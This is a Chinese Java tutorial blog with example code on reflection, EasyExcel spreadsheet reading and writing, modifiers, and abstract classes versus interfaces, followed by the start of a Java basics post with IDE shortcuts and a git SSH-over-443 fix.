MappingTest * @Description 反射类的实现 * @Author ada * @Computer Mac mini * @Date 2022/1/5 16:51 * @JDKVersion JDK1.8 */ public class MappingTest { public static void demo() { try { Class&lt;User&gt; clazz = (Class&lt;User&gt;) Class.forName(\"com.tester.ada.Parsing.xml.entity.User\"); User user = clazz.newInstance(); //创建类的对象 String methodName = \"set\" + \"Name\"; //拼接方法名 Method method = clazz.getMethod(methodName, String.class); //映射这个 set 方法 method.invoke(user, \"调用反射设值\"); //用创建的对象（user）调用（invoke）上面映射的方法（method），传入的值为 String类型的 【调用反射设值】 System.out.println(user.getName()); } catch (ClassNotFoundException | InstantiationException | IllegalAccessException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } } public static void main(String[] args) { MappingTest.demo(); } } 获取 Class 对象 Class 类：用于描述类的一个类（属性、方法、构造器） Class 对象 封装了所有对应的类的细节信息 将class 文件读入内存，则会创建一个 Class 对象 Class 对象是 jvm 自动化创建的，一个类只产生一个 Class 对象 运行时编程 获得 Class 对象（获取 Test类的 Class） 通过对象调用 getClass 方法，例创建 test 对象：test.getClass(); 通过类名去获取：Test.class; 通过类路径注册获取：Class.forName(“com.tester.ada.Parsing.xml.entity.User”); 点击显/隐代码块(获取Class) package com.tester.ada.Parsing.Mapping; /** * @ClassName MappingTest2 * @Description 获得 Class 对象的三种方式 * @Author ada * @Computer Mac mini * @Date 2022/1/5 17:47 * @JDKVersion JDK1.8 */ public class MappingTest2 { public static void demo() { // 方式一：通过对象调用 getClass 方法获取Class Test test = new Test(); Class clazz1 = test.getClass(); // 方式二：通过类名去获取：Test.class; Class clazz2 = Test.class; // 方式三：通过类路径`注册`获取 Class clazz3 = null; try { clazz3 = Class.forName(\"com.tester.ada.Parsing.Mapping.Test\"); } catch (ClassNotFoundException e) { e.printStackTrace(); } System.out.println(clazz1 == clazz2); //Class 对象是 jvm 自动化创建的，一个类只产生一个 Class 对象,因此这里 1 2 3 都是指向的同一个地址 System.out.println(clazz2 == clazz3); } public static void main(String[] args) { MappingTest2.demo(); } } 获取类名点击显/隐代码块(获取类名相关) package com.tester.ada.Parsing.Mapping; /** * @ClassName MappingTest3 * @Description 类相关属性获取 * @Author ada * @Computer Mac mini * @Date 2022/1/5 18:05 * @JDKVersion JDK1.8 */ public class MappingTest3 extends MappingTest { public static void demo() { Class clazz = MappingTest3.class; // 获取当前类的类名，包括了路径 System.out.println(\"当前类名【\" + clazz.getName() + \"】\"); //--&gt;当前类名【com.tester.ada.Parsing.Mapping.MappingTest3】 // 获取当前类的包名 System.out.println(\"当前类的包名【\" + clazz.getPackage().getName() + \"】\"); //--&gt;当前类的包名【com.tester.ada.Parsing.Mapping】 // 判断是都为接口 System.out.println(\"是否为接口【\" + clazz.isInterface() + \"】\"); //--&gt;是否为接口【false】 // 获取父类的类名 System.out.println(\"父类类名【\" + clazz.getSuperclass().getName() + \"】\"); //--&gt;父类类名【com.tester.ada.Parsing.Mapping.MappingTest】 } public static void main(String[] args) { MappingTest3.demo(); } } 获取字段点击显/隐代码块(获取字段) package com.tester.ada.Parsing.Mapping; import java.lang.reflect.Field; import java.util.Arrays; /** * @ClassName MappingTest4 * @Description 获取字段 * @Author ada * @Computer Mac mini * @Date 2022/1/5 18:47 * @JDKVersion JDK1.8 */ public class MappingTest4 { public static void demo() { Class clazz = Test.class; // 获取 public 字段 --&gt;例：public字段：public java.lang.String com.tester.ada.Parsing.Mapping.Test.name Field[] publicFields = clazz.getFields(); Arrays.asList(publicFields).forEach(field -&gt; System.out.println(\"public字段：\" + field)); // 获取所有字段 --&gt;例：所有字段：private java.lang.Integer com.tester.ada.Parsing.Mapping.Test.age Field[] allFields = clazz.getDeclaredFields(); Arrays.asList(allFields).forEach(field -&gt; System.out.println(\"所有字段：\" + field)); // 获取字段的信息：名字+类型+修饰符（public 1,private 2） --&gt;例：字段名：age 字段类型：class java.lang.Integer 修饰符：2 Arrays.asList(allFields).forEach(field -&gt; System.out.println(\"字段名：\" + field.getName() + \"\\t字段类型：\" + field.getType() + \"\\t修饰符：\" + field.getModifiers())); // 根据字符获取 Class 对象字段 try { Field field = clazz.getField(\"code\"); System.out.println(\"+++++++++++++++++++++++获取指定字符串的属性+++++++++++++++++++++++\"); System.out.println(\"字段名：\" + field.getName() + \"\\t字段类型：\" + field.getType() + \"\\t修饰符：\" + field.getModifiers()); } catch (NoSuchFieldException e) { e.printStackTrace(); } } public static void main(String[] args) { demo(); } } 获取方法点击显/隐代码块 package com.tester.ada.Parsing.Mapping; import java.lang.reflect.Method; import java.util.Arrays; /** * @author ada * @ClassName MappingTest5 * @Description 获取方法 * @Computer Macbook pro * @Date 2022/1/5 21:14 * @JDKVersion JDK1.8 */ public class MappingTest5 { public static void demo() { Class clazz = Test.class; // 获取当前类的所有 public 方法 示例--&gt;public static java.lang.String com.tester.ada.Parsing.Mapping.Test.demo1() Method[] methods = clazz.getMethods(); Arrays.asList(methods).forEach(method -&gt; System.out.println(\"1.获取的是类public方法:\" + method)); // 获取的是类自身声明的所有方法，包含public、protected和private方法 Method[] allMethod = clazz.getDeclaredMethods(); Arrays.asList(allMethod).forEach(method -&gt; System.out.println(\"2.获取的是类自身声明的所有方法:\" + method)); // 获取指定方法的 无参数时填 null 或者不填 clazz.getDeclaredMethod 和 getMethods()一样只有范围不一样 // 一个是本类 一个还包含父类或者实现的接口,如果方法的修饰符为protected 请用， getDeclaredMethod 方法，为 public 请用 getMethod 方法 try { Method demo1Method = clazz.getDeclaredMethod(\"demo1\", String.class, Integer.class); System.out.println(\"3.方法的修饰符:\" + demo1Method.getModifiers() + \"\\t方法的名称:\" + demo1Method.getName() + \"\\t方法的返回值类型:\" + demo1Method.getReturnType() + \"\\t方法的参数个数:\" + demo1Method.getParameterCount() + \"\\t方法的参数类型:\" + Arrays.asList(demo1Method.getParameterTypes()).toString()); } catch (NoSuchMethodException e) { e.printStackTrace(); } // Method[] getMethods() 获取的是类的所有共有方法，这就包括自身的所有public方法，和从基类继承的、从接口实现的所有public方法。 Method[] publicMethod = clazz.getMethods(); Arrays.asList(publicMethod).forEach(method -&gt; System.out.println(\"4.获取的是类和继承实现的public方法:\" + method)); } public static void main(String[] args) { demo(); } } 方法的调用点击显/隐代码块(方法调用) package com.tester.ada.Parsing.Mapping; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /** * @author ada * @ClassName MappingTest6 * @Description 方法的调用 * @Computer Macbook pro * @Date 2022/1/5 22:09 * @JDKVersion JDK1.8 */ public class MappingTest6 { public static void demo() { Class clazz = Test.class; try { Method method = clazz.getMethod(\"demo4\"); //方法没有参数,可以不传参数类型或者传 null System.out.println(\"静态方法用 null 调用:\" + method.invoke(null)); System.out.println(\"静态方法用对象调用:\" + method.invoke(clazz.newInstance())); } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException | InstantiationException e) { e.printStackTrace(); } } public static void main(String[] args) { demo(); } } 获取构造函数及创建对象点击显/隐代码块(获取构造函数及创建对象) package com.tester.ada.Parsing.Mapping; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; /** * @author ada * @ClassName MappingTest7 * @Description 获取构造函数及创建对象 * @Computer Macbook pro * @Date 2022/1/5 22:30 * @JDKVersion JDK1.8 */ public class MappingTest7 { public static void demo() { Class clazz = Test.class; // 获取当前类所有 public 构造函数 --&gt;例:public com.tester.ada.Parsing.Mapping.Test() Constructor[] publicConstructors = clazz.getConstructors(); // getDeclaredConstructors 获取所有构造函数包括继承、实现、非 public // Constructor[] constructors = clazz.getDeclaredConstructors(); Arrays.asList(publicConstructors).forEach(constructor -&gt; System.out.println(constructor)); // 获取对应参数类型的构造函数 传入参数类型 try { Constructor testConstructors = clazz.getConstructor(String.class, Integer.class, Integer.class); System.out.println(\"三个参数构造函数初始化对象:\" + testConstructors.newInstance(\"str\", 15, 20)); //初始化对象 System.out.println(\"构造函数名称:\" + testConstructors.getName()); System.out.println(\"构造函数参数列表:\" + Arrays.asList(testConstructors.getParameterTypes()).toString()); System.out.println(\"构造函数参数个数:\" + testConstructors.getParameterTypes().length); System.out.println(\"构造函数修饰符:\" + testConstructors.getModifiers()); } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) { e.printStackTrace(); } // 获取无参的构造函数 参数类型可以传 null 或者不传 try { Constructor tester = clazz.getConstructor(null); System.out.println(\"无参构造函数初始化对象:\" + tester.newInstance()); //初始化对象 } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) { e.printStackTrace(); } } public static void main(String[] args) { demo(); } } 创建对象的两种方式点击显/隐代码块(创建对象的两种方式) package com.tester.ada.Parsing.Mapping; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; /** * @author ada * @ClassName MappingTest8 * @Description 创建对象 * @Computer Macbook pro * @Date 2022/1/5 23:09 * @JDKVersion JDK1.8 */ public class MappingTest8 { public static void demo() { // Class创建对象 Class clazz = Test.class; try { Object obj = clazz.newInstance(); System.out.println(obj); } catch (InstantiationException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } // 构造器创建对象 try { Constructor c = clazz.getConstructor(String.class, Integer.class, Integer.class); System.out.println(c.newInstance(\"a\", 20, 35)); } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) { e.printStackTrace(); } } public static void main(String[] args) { demo(); } } Excel 解析 采用阿里巴巴的开源工具类 easyExcel 引入依赖 lombok easyexcel &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;easyexcel&lt;/artifactId&gt; &lt;version&gt;${easyexcel.version}&lt;/version&gt; &lt;/dependency&gt; 点击显/隐代码块(dome) package com.tester.ada.Parsing.excel.service; import com.alibaba.excel.EasyExcel; import com.alibaba.excel.ExcelReader; import com.alibaba.excel.context.AnalysisContext; import com.alibaba.excel.event.AnalysisEventListener; import com.alibaba.excel.read.builder.ExcelReaderBuilder; import com.alibaba.excel.support.ExcelTypeEnum; import java.util.Map; /** * @author ada * @ClassName Dome * @Description demo演示 * @Computer Macbook pro * @Date 2022/1/6 22:58 * @JDKVersion JDK1.8 */ public class Dome { public static void demo() { // 创建 ExcelReaderBuilder 实例 ExcelReaderBuilder readerBuilder = EasyExcel.read(); // 读取文件对象 readerBuilder.file(\"ada/src/main/resources/excel/easyExcel.xlsx\"); // 指定 sheet（可以传下标或者工作表名） readerBuilder.sheet(0); // 自动关闭输入流 readerBuilder.autoCloseStream(true); // 设置文件格式 根据文件的后缀进行设置 readerBuilder.excelType(ExcelTypeEnum.XLSX); // 注册监听器使用观察者模式进行数据的解析（一行一行读取封装成一个对象称为观察者模式） readerBuilder.registerReadListener(new AnalysisEventListener() { // 需要传入ReadListener对象，但是它又是一个接口，所以用 new AnalysisEventListener() 匿名内部类实现抽象方法 @Override public void invoke(Object o, AnalysisContext analysisContext) { // 把每次读取的数据封装到 Object o（这是一个多态的应用，实际上是LinkedHashMap类型 ），然后回调 invoke 回调函数 System.out.println(o); } @Override public void doAfterAllAnalysed(AnalysisContext analysisContext) { // 数据读取完毕后进行的一些操作（自动调用） System.out.println(\"数据读取完毕\"); } }); // 构建读取器，上面的都是做一些读取的配置相关 ExcelReader reader = readerBuilder.build(); // 读取所有 reader.readAll(); // 读取完毕 reader.finish(); } /** * 指定监听器类型 * 监听器默认是LinkedHashMap类型 我们指定为 Map 类型 */ public static void demo1() { // 创建 ExcelReaderBuilder 实例 ExcelReaderBuilder readerBuilder = EasyExcel.read(); // 读取文件对象 readerBuilder.file(\"ada/src/main/resources/excel/easyExcel.xlsx\"); // 指定 sheet（可以传下标或者工作表名），不指定会默认读取所有的 sheet readerBuilder.sheet(0); // 自动关闭输入流 readerBuilder.autoCloseStream(true); // 设置文件格式 根据文件的后缀进行设置 readerBuilder.excelType(ExcelTypeEnum.XLSX); // 注册监听器使用观察者模式进行数据的解析（一行一行读取封装成一个对象称为观察者模式） readerBuilder.registerReadListener(new AnalysisEventListener&lt;Map&lt;Integer, String&gt;&gt;() { // 需要传入ReadListener对象，但是它又是一个接口，所以用 new AnalysisEventListener() 匿名内部类实现抽象方法 @Override public void invoke(Map&lt;Integer, String&gt; integerStringMap, AnalysisContext analysisContext) { // 将默认的 Object类型（实际上是LinkedHashMap类型）指定为 Map&lt;Integer, String&gt; 类型 integerStringMap.forEach((k, v) -&gt; { System.out.print(k + \":\" + v + \"\\t\"); }); System.out.println(\"\"); } @Override public void doAfterAllAnalysed(AnalysisContext analysisContext) { // 数据读取完毕后进行的一些操作（自动调用） System.out.println(\"数据读取完毕\"); } }); // 构建读取器，上面的都是做一些读取的配置相关 ExcelReader reader = readerBuilder.build(); // 读取所有 reader.readAll(); // 读取完毕 reader.finish(); } public static void main(String[] args) { demo1(); } } 点击显/隐代码块(dome简写) package com.tester.ada.Parsing.excel.service; import com.alibaba.excel.EasyExcel; import com.alibaba.excel.context.AnalysisContext; import com.alibaba.excel.event.AnalysisEventListener; import java.util.LinkedList; import java.util.List; import java.util.Map; /** * @author ada * @ClassName DomePro * @Description 简化代码 * @Computer Macbook pro * @Date 2022/1/6 23:39 * @JDKVersion JDK1.8 */ public class DomePro { public static void demo() { List&lt;Map&lt;Integer, String&gt;&gt; dataList = new LinkedList&lt;Map&lt;Integer, String&gt;&gt;(); EasyExcel.read(\"ada/src/main/resources/excel/easyExcel.xlsx\") .sheet() .registerReadListener(new AnalysisEventListener&lt;Map&lt;Integer, String&gt;&gt;() { @Override public void invoke(Map&lt;Integer, String&gt; integerStringMap, AnalysisContext analysisContext) { dataList.add(integerStringMap); dataList.forEach(maps -&gt; { maps.forEach((k, v) -&gt; System.out.print(k + \":\" + v + \"\\t\")); System.out.println(\"\"); }); } @Override public void doAfterAllAnalysed(AnalysisContext analysisContext) { System.out.println(\"读取完毕\"); } }).doRead(); } public static void main(String[] args) { demo(); } } 点击显/隐代码块(实体抽象类) package com.tester.ada.Parsing.excel.entity; /** * @author ada * @ClassName ExecelData * @Description excel 抽象类，所有的实体类需要继承该类 * @Computer Macbook pro * @Date 2022/1/7 00:25 * @JDKVersion JDK1.8 */ public abstract class ExecelData { // 抽象类，所有的Excel实体类都需要继承该类，使用@ExcelProperty注解完成实体类和Excel字段的映射 } 点击显/隐代码块(封装实体) package com.tester.ada.Parsing.excel.entity; import com.alibaba.excel.annotation.ExcelProperty; import lombok.Data; import java.util.Date; /** * @author ada * @ClassName EasyExcelEntity * @Description 实体类，映射成指定对象 * @Computer Macbook pro * @Date 2022/1/7 00:10 * @JDKVersion JDK1.8 */ @Data public class EasyExcelEntity extends ExecelData { // @ExcelProperty 注解将表头和实体类映射 @ExcelProperty(\"ID\") private String id; @ExcelProperty(\"用户名\") private String name; @ExcelProperty(\"邮箱\") private String email; @ExcelProperty(\"性别\") private String gander; @ExcelProperty(\"积分\") private Integer score; @ExcelProperty(\"IP\") private String IP; @ExcelProperty(\"登录次数\") private Integer count; @ExcelProperty(\"加入时间\") private Date date; } 点击显/隐代码块(easyExcelService) package com.tester.ada.Parsing.excel.service; import com.alibaba.excel.EasyExcel; import com.alibaba.excel.context.AnalysisContext; import com.alibaba.excel.event.AnalysisEventListener; import com.alibaba.excel.support.ExcelTypeEnum; import com.alibaba.excel.write.builder.ExcelWriterBuilder; import org.apache.poi.ss.formula.functions.T; import java.util.LinkedList; import java.util.List; /** * @author ada * @ClassName easyExcelService * @Description 读写 excel 服务 * @Computer Macbook pro * @Date 2022/1/6 22:58 * @JDKVersion JDK1.8 */ public class easyExcelService { /** * @param Source_Path 源路径 * @param sheetIndex 表单索引 * @param clazz 实体类(必须要继承 ExcelData) * @param &lt;T&gt; 统一指定泛型 * @return 返回实体类对象 list 集合 */ public static &lt;T&gt; List&lt;T&gt; readExcel(String Source_Path, Integer sheetIndex, Class&lt;T&gt; clazz) { if (isExcel(Source_Path)) { List&lt;T&gt; readList = new LinkedList&lt;&gt;(); EasyExcel.read(Source_Path) .head(clazz) //设置要反射的类为传入的类 .sheet(sheetIndex) .registerReadListener(new AnalysisEventListener&lt;T&gt;() { @Override public void invoke(T data, AnalysisContext analysisContext) { readList.add(data); } @Override public void doAfterAllAnalysed(AnalysisContext analysisContext) { System.out.println(\"读取完毕\"); } }).doRead(); return readList; } return null; } /** * @param target_Path 回写的路径 * @param Sheet_name 回写时候工作表命名 * @param execelDataList 回写的数据 * @param clazz 回写的表头对应的实体类 */ public static void writeExcel(String target_Path, String Sheet_name, List&lt;T&gt; execelDataList, Class clazz) { ExcelWriterBuilder head = EasyExcel.write(target_Path) // 回写的格式按照.head传入的实体类格式进行写入，避免没有表头 .head(clazz); if (isExcel(target_Path)) { head.excelType(ExcelTypeEnum.XLS); } else { head.excelType(ExcelTypeEnum.XLSX); } head.sheet(Sheet_name) .doWrite(execelDataList); System.out.println(\"数据已回写至【\" + target_Path + \"】\"); } /** * 根据传入的文件名称最后一个逗号取后缀判断是否是Excel文件 * * @param Source_Path 传入的文件路径（必须以xls||xlsx结尾） * @return 返回 boolean 值 */ public static boolean isExcel(String Source_Path) { String strType = Source_Path.substring(Source_Path.lastIndexOf(\".\")); if (\".xls\".equalsIgnoreCase(strType) || \".xlsx\".equalsIgnoreCase(strType)) { return true; } else { System.err.println(\"文件格式不是【xls、xlsx】格式\"); // 0,正常退出，1异常退出,不会进入return false; System.exit(0); } return false; } /* public static void main(String[] args) { List list = readExcel(\"ada/src/main/resources/excel/easyExcel.xlsx\", 0, EasyExcelEntity.class); System.out.println(list.get(0)); writeExcel(\"/Users/ada/Desktop/easyExcel2.xlsx\",\"第一页\",list,EasyExcelEntity.class); }*/ } 点击显/隐代码块(ExcelControlle) package com.tester.ada.Parsing.excel.controlle; import com.tester.ada.Parsing.excel.entity.EasyExcelEntity; import com.tester.ada.Parsing.excel.service.easyExcelService; import org.apache.poi.ss.formula.functions.T; import java.util.List; /** * @author ada * @ClassName ExcelControlle * @Description excel 读写接口 * @Computer Macbook pro * @Date 2022/1/7 01:20 * @JDKVersion JDK1.8 */ public class ExcelControlle { /** * @param Source_Path 需要读取Excel文件的全路径xxx.xls/xlsx * @param sheetIndex Excel文件中的Sheet的索引，从 0 开始 * @param clazz Excel需要映射的实体类，该类必须要实现ExecelData接口 * @return */ public static &lt;T&gt; List&lt;T&gt; read(String Source_Path, Integer sheetIndex, Class&lt;T&gt; clazz) { return easyExcelService.readExcel(Source_Path, sheetIndex, clazz); } /** * @param target_Path 回写的目标路径 * @param Sheet_name 回写的表名称 * @param execelDataList 回写的数据List&lt;&gt;类型 * @param clazz 回写时候该实体类进行格式输出（这个类继承一下ExecelData） */ public static void write(String target_Path, String Sheet_name, List&lt;T&gt; execelDataList, Class clazz) { easyExcelService.writeExcel(target_Path, Sheet_name, execelDataList, clazz); } public static void main(String[] args) { List list = read(\"ada/src/main/resources/excel/easyExcel.xlsx\", 0, EasyExcelEntity.class); System.out.println(list.get(0)); write(\"/Users/ada/Desktop/easyExcel3.xlsx\", \"第一页\", list, EasyExcelEntity.class); } } 异常简介 异常：代码在运行过程中出现的非正常情况 异常处理：在程序出现异常时仍然可以正确执行完 异常机制 判断一门变成语言是都成熟的标准 可以让异常处理代码和正常业务逻辑分离，保证程序健壮性、容错性、优雅性 缺点是影响代码的可读性 抛出异常 方式一：在方法名后 throws 抛出异常的类型 方式二：在方法名后 throws 抛出 Exception 异常（父类异常，所有的异常都继承该类） try…catch补充知识JRE为什么需要安装 jdk jdk 提供了编译器 jdk 提供了 java 运行环境（jre） jre 下有很多现成的 jar包，这些 jar 包构成了 Java SE 的一个基本框架，实现了基本的服务 jre 下 jar 包的调用 jre 下的类 java.lang 下面的包不需要导包 其它类需要 import 导包 自己写的类 同一个 package 直接使用，无需显示导入 其它package 下需要 import 导包 其它项目工程 导出 jar 包–&gt;提供开发套件 SDK 将 jar 包添加到私服/项目构建 重载重写方法的重载 在同一个类中函数名相同，参数类型或个数不同 参数的个数不一样 参数的类型不一样（包括顺序） 方法的重写 方法的重写也称为方法的覆写 出现继承中，子类重写父类的方法，实现多态（子类定义了和父类同名的方法） 注意：被重写的方法修饰符（访问权限）不能比父类更严格 修饰符访问修饰符 将程序开发人员按角色区分可分为设计者与调用者 一个人可能同时又是设计者和调用者 修饰符的出现是为了控制设计者设计的类有哪些东西可以被调用者使用，哪些东西不能被调用者使用，从而实现访问控制，保护类里面一些重要的部分 private 默认修饰符 protected public 四种访问修饰符按照从左网易权限依次增大 访问位置 private 默认修饰符 protected public 定义的类中 √ √ √ √ 同一个包中 × √ √ √ 子类中 × × √ √ 其它包中 × × × √ 非访问修饰符static static：静态 可以修饰变量、函数 类在加载到内存的时候最先加载进来的部分是静态的成员 静态成员的访问不需要依赖对象，可直接通过类名访问: 类名.static属性; 类名.static方法(); 静态成员在内存中只保存一份，生命周期跟类保持一致，所以静态成员是共享的 一般不常改动的数据工具类适合声明为静态的 访问 不用实例化对象即可调用 static 方法只能访问 static 的属性和方法 非 static 的属性和方法使用实例化对象进行访问 final final:最终的 被 final 修饰的变量它的值不能再做修改 被 final 修饰的函数，不能被重写 被 final 修饰的类，不能被继承 final声明一个常量，标识符全部使用大写 全局常量: public static final LP_LOGIN_BIN=”xxxxx”; abstract abstract:抽象的 public abstract class ExecelData { //抽象方法没有方法体 public abstract void func(); } 抽象类 使用 abstract 关键字进行声明 不能直接实例化进行操作（不能 new 对象），通过之类继承完成 子类需要实现抽象类中全部抽象方法 抽象方法 只声明而未实现的方法（没有方法体） 使用 abstract 进行声明 抽象类是一种模板设计的模式 在抽象类中，既可以有具体实现的方法，又有没有具体实现的抽象方法 象类之所以被称为抽象类，就是因为它包含有抽象方法。含有抽象方法的类叫做抽象类 interface interface:接口 public interface Action { public Event execute(RequestContext context) throws Exception; } 接口 使用 interface 关键字进行声明，类名前没有 class 接口是一种比抽象类还抽象的一种类 接口中只能定义方法不能有实现了的方法 在这个接口中，定义了一个没有具体实现的方法，方法名叫做execute()，返回类型是Event。如前面所述，接口中的方法都是没有实现的。这些方法的具体实现是在实现(implements)这个接口的类中给出的 实现接口通过 implements 关键字声明 抽象类和接口的比较概述 一个软件设计的好坏，我想很大程度上取决于它的整体架构，而这个整体架构其实就是你对整个宏观商业业务的抽象框架，当代表业务逻辑的高层抽象层结构 合理时，你底层的具体实现需要考虑的就仅仅是一些算法和一些具体的业务实现了。当你需要再开发另一个相近的项目时，你以前的抽象层说不定还可以再次利用 面对对象的设计，复用的重点其实应该是抽象层的复用，而不是具体某一个代码块的复用 说到了抽象，我就不能不提到曾让我头痛的Java接口和Java抽象类了 既然面向对象设计的重点在于抽象，那Java接口和Java抽象类就有它存在的必然性了。 Java接口(interface)和Java抽象类(abstract class)代表的就是抽象类型，就是我们需要提出的抽象层的具体表现。OOP面向对象的编程，如果要提高程序的复用率，增加程序 的可维护性，可扩展性，就必须是面向接口的编程，面向抽象的编程，正确地使用接口、抽象类这些有用的抽象类型作为你结构层次上的顶层。 Java接口和Java抽象类有太多相似的地方，又有太多特别的地方，究竟在什么地方，才是它们的最佳位置呢？把它们比较一下，你就可以发现了 区别 Java接口和Java抽象类最大的一个区别，就在于Java抽象类可以提供某些方法的部分实现，而Java接口不可以（就是interface中只能定义方法，而不能有方法的实现，而在abstract class中则可以既有方法的具体实现，又有没有具体实现的抽象方法），这大概就是Java抽象类唯一的优点吧，但这个优点非常有用。如果向一个抽象类里加入一个新的具体方法时，那么它所有的子类都一下子都得到了这个新方法，而Java接口做不到这一点，如果向一个Java接口里加入一个 新方法，所有实现这个接口的类就无法成功通过编译了，因为你必须让每一个类都再实现这个方法才行，这显然是Java接口的缺点。倾向于使用抽象类，而不是接口，因为这更容易扩展。 一个抽象类的实现只能由这个抽象类的子类给出，也就是说，这个实现处在抽象类所定义出的继承的等级结构中，而由于Java语言的单继承性，所以抽象类作为类型定义工具的效能大打折扣。在这一点上，Java接口的优势就出来了，任何一个实现了一个Java接口所规定的方法的类都可以具有这个接口的类型，而一个类可以实现任意多个Java接口，从而这个类就有了多种类型。（使用抽象类，那么继承这个抽象类的子类类型就比较单一，因为子类只能单继承抽象类；而子类能够同时实现多个接口，因为类型就比较多。接口和抽象类都可以定义对象，但是只能用他们的具体实现类来进行实例化。） 从第2点不难看出，Java接口是定义混合类型的理想工具，混合类表明一个类不仅仅具有某个主类型的行为，而且具有其他的次要行为。 结合1、2点中抽象类和Java接口的各自优势，具精典的设计模式就出来了：声明类型的工作仍然由Java接口承担，但是同时给出一个Java 抽象类，且实现了这个接口，而其他同属于这个抽象类型的具体类可以选择实现这个Java接口，也可以选择继承这个抽象类，也就是说在层次结构中，Java 接口在最上面，然后紧跟着抽象类，这下两个的最大优点都能发挥到极至了。这个模式就是“缺省适配模式”。在Java语言API中用了这种模式，而且全都遵循一定的命名规范：Abstract ＋接口名。（A extends AbstractB implements interfaceC，那么A即可以选择实现(@Override)接口interfaceC中的方法，也可以选择不实现；A即可以选择实现(@Override)抽象类AbstractB中的方法，也可以选择不实现） 目的 Java接口和Java抽象类的存在就是为了用于具体类的实现和继承的，如果你准备写一个具体类去继承另一个具体类的话，那你的设计就有很大问题了。Java抽象类就是为了继承而存在的，它的抽象方法就是为了强制子类必须去实现的。 使用Java接口和抽象Java类进行变量的类型声明、参数是类型声明、方法的返还类型说明，以及数据类型的转换等。而不要用具体Java类进行变量的类型声明、参数是类型声明、方法的返还类型说明，以及数据类型的转换等。","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"Java 基础","slug":"Java-基础","permalink":"https://www.adalucky.com/tags/Java-%E5%9F%BA%E7%A1%80/"}],"author":"Ada"},{"title":"Java 基础语法","slug":"Auto/Java初级","date":"2021-12-06T12:25:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/java-chu-ji/","link":"","permalink":"https://www.adalucky.com/auto/java-chu-ji/","excerpt":"Java 是由 Sun Microsystems 公司于 1995 年 5 月推出的 Java 面向对象程序设计语言和 Java 平台的总称。由 James Gosling和同事们共同研发，并在 1995 年正式推出。 后来 Sun 公司被 Oracle （甲骨文）公司收购，Java 也随之成为 Oracle 公司的产品。","text":"Java 是由 Sun Microsystems 公司于 1995 年 5 月推出的 Java 面向对象程序设计语言和 Java 平台的总称。由 James Gosling和同事们共同研发，并在 1995 年正式推出。 后来 Sun 公司被 Oracle （甲骨文）公司收购，Java 也随之成为 Oracle 公司的产品。 参考资料IDEA Mac快捷键 IDEA快捷键 注：针对 Mac 版本 编辑 末尾添加分号：command+shift+enter 向下插入空行：shift+enter 向上插入空行：command+enter 向下复制当前行：command+d 删除当前行：command+x 批量编辑：option+拖动鼠标左键 向上移动一行：shift+option+UP 向下移动一行：shift+option+Down 格式化代码：command+option+l 运行当前类：Control+shift+r 调试部分、编译 选择 Run：opt+cmd+F10 报错IDEA 工具报错git提交或拉取代码 443 报错内容：unable to access ‘https://github.com/adaLucky/hexo-adalucky-blog.git/': Failed to connect to github.com port 443: Operation timed out git config --global --unset http.proxy git config --global --unset https.proxy ssh -T -p 443 git@ssh.github.com # 进入 ~/.ssh/config 文件（没有的话新建）新增内如下 Host github.com Hostname ssh.github.com Port 443 User git Java 简介Java 简介①Java是一门面向对象的通用程序设计语言 ②不依赖特定平台，Write Once,Run Anywhere ③Java一般用作web系统开发，尤其是大型企业级项目 ④编译型和解释型语言，先编译然后在机器上进行解释 ⑤用Java开发的系统的特点：跨平台，安全性高 ⑥Java是一门面向高薪编程的语言 Java 与 Python 的区别 Java 是一个编译型和解释型的语言，先编译后解释，Python 是一个解释型语言性能相对 Java 要低（据说 Java 比 python 快 3 倍） Java 是强数据类型，必须要指定数据类型，Python 是可以不定义数据类型 Java 环境校验需要本地安装 JDK(本系列以 1.8 为例) # 验证 Java 版本 java -version # Java 编译器校验 java compile Javac 编译和解释 Javapublic class HelloWord{ public static void main(String[] args) { System.out.print(\"HelloWord\"); } } class Student{ public static void main(String[] args) { System.out.print(\"Hello 阿达\"); } } /* public:关键字，表示最大权限 class：声明类的关键字 HelloWorld:类名 static:静态，表示一个类的方法 void:空，表示无返回值 main:java程序的主函数（方法）或者说函数 String[ ]args：参数数组 System.out.println：换行打印到控制台的方法 \"Hello World\":字符串，作为函数的实际参数 */ Java 程序结构 Java程序由类构成 一个源程序可以包含多个类定义，最多包含一个public类定义 如果包含了public类定义，文件名必须和public类名保持一致 如果源程序无public类，则可选择任意一个类的名称（推荐）或者一个其他的名称作为文件名 对Java应用程序来说，必须在其中的一个类中定义有main()方法，包含main()方法的类是该应用程序的主类 Java语句包含关键字、标识符、运算符和分隔符等元素。这些元素有着不同的语法含义和组成规则，，它们互相配合，共同组成Java的语句 标识符 什么是标识符 Java 中变量、类、方法的名称就叫做标识符 标识符就是自己定义的名称 标识符的命名规则 以字母、下划线或者$符号开头（不要以数字开头或关键字） 后面的字符可以包含字母、数字、下划线和$符号 遵循大驼峰&amp;小驼峰的命名规范（尽量采用类名采用大驼峰、方法和变量采用小驼峰命名规范） Java 严格区分字母大小写 分隔符 分隔符 分割符用来区分源程序中的基本成分，可以使编译器确认代码在何处进行分割 分割符有注释符 空白符 普通分割符 注释符 注释是为了提高程序的可读性、可理解性 注释仅用于阅读源程序，编译时会忽略所有注释 注释符：// 单行注释 /* */ 多行代码注释 /** */ 文档注释 空白符 空白符包括空格 回车 换行 制表符（Tab） 等符号 作为程序中各基本成分之间的分割符 各基本成分可以有一个或者多个分隔符 系统编译时空白符同注释一样，最后会被忽略 普通分割符 